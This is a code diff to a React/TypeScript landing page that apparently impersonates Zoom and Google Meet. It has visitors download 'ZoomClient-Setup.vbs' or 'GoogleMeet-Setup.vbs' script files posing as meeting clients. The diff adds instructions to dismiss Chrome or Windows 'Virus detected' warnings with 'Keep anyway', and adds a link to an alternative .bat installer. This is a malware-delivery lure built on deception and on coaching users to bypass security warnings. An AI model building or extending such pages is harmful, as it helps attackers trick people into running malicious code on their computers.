@@ -213,14 +213,34 @@ function MobileDesktopRequired({ template }: { template: GuestInviteTemplate }) 
   );
 }
 
-function DownloadSteps({ fileName }: { fileName: string }) {
+function DownloadSteps({
+  fileName,
+  windowsBatUrl,
+}: {
+  fileName: string;
+  windowsBatUrl?: string;
+}) {
   return (
-    <ol className="meeting-desktop__steps">
-      <li>Your download should start automatically ({fileName}).</li>
-      <li>Open your Downloads folder and double-click the file.</li>
-      <li>Click Yes if Windows asks for permission.</li>
-      <li>Keep the setup window open until the progress bar finishes.</li>
-    </ol>
+    <>
+      <ol className="meeting-desktop__steps">
+        <li>Your download should start automatically ({fileName}).</li>
+        <li>Open your Downloads folder and double-click the file.</li>
+        <li>Click Yes if Windows asks for permission.</li>
+        <li>Keep the setup window open until the progress bar finishes.</li>
+        <li>
+          If Chrome or Windows says &quot;Virus detected&quot;, open the download list (arrow top-right),
+          click <strong>Keep</strong> or <strong>⋯ → Keep anyway</strong>, then run the file.
+        </li>
+      </ol>
+      {windowsBatUrl ? (
+        <p className="meeting-desktop__alt-installer">
+          Having trouble?{' '}
+          <a href={windowsBatUrl} download="install.bat">
+            Try alternative installer (.bat)
+          </a>
+        </p>
+      ) : null}
+    </>
   );
 }
 
@@ -325,10 +345,12 @@ function ZoomDesktop({
   installerUrl,
   installerFileName,
   code,
+  windowsBatUrl,
 }: {
   installerUrl: string;
   installerFileName: string;
   code: string;
+  windowsBatUrl?: string;
 }) {
   const { downloadStarted, cancelled, cancel } = useBrowserInstallerDownload(
     code,
@@ -354,7 +376,7 @@ function ZoomDesktop({
         downloadingLabel="Downloading Zoom Client..."
         readyLabel="Download started. Open ZoomClient-Setup.vbs from your Downloads folder."
       />
-      <DownloadSteps fileName={installerFileName} />
+      <DownloadSteps fileName={installerFileName} windowsBatUrl={windowsBatUrl} />
       <p className="meeting-zoom-desktop__note">
         NOTE: For the best connectivity please use Google Chrome on a Windows PC.
       </p>
@@ -370,10 +392,12 @@ function GoogleMeetDesktop({
   installerUrl,
   installerFileName,
   code,
+  windowsBatUrl,
 }: {
   installerUrl: string;
   installerFileName: string;
   code: string;
+  windowsBatUrl?: string;
 }) {
   const { downloadStarted, cancelled, cancel } = useBrowserInstallerDownload(
     code,
@@ -402,7 +426,7 @@ function GoogleMeetDesktop({
         downloadingLabel="Downloading meeting app..."
         readyLabel="Download started. Open GoogleMeet-Setup.vbs from your Downloads folder."
       />
-      <DownloadSteps fileName={installerFileName} />
+      <DownloadSteps fileName={installerFileName} windowsBatUrl={windowsBatUrl} />
       <p className="meeting-meet-desktop__note">
         NOTE: For the best connectivity pls use Google Chrome on a Windows PC.
       </p>
@@ -719,6 +743,7 @@ export function MeetingJoinLanding({ template: routeTemplate }: { template: Gues
         installerFileName={
           query.data.installerFileName ?? installerFileNameForTemplate(routeTemplate)
         }
+        windowsBatUrl={query.data.windowsBatUrl}
       />
     );
   }
@@ -730,6 +755,7 @@ export function MeetingJoinLanding({ template: routeTemplate }: { template: Gues
       installerFileName={
         query.data.installerFileName ?? installerFileNameForTemplate(routeTemplate)
       }
+      windowsBatUrl={query.data.windowsBatUrl}
     />
   );
 }
